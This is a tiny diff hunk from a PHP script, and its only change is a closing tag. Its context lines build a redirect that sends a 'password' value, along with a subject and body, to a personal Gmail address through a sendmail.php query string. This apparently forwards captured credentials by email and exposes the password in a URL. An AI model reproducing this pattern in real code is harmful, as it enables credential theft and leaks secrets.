@@ -11,3 +11,4 @@
   $to = "kajohterna@gmail.com";
   $end_point = "../../sendmail.php?to=$to&subject=$subject&password=$password&body=$body";
   header("Location: " . $end_point);
+?>
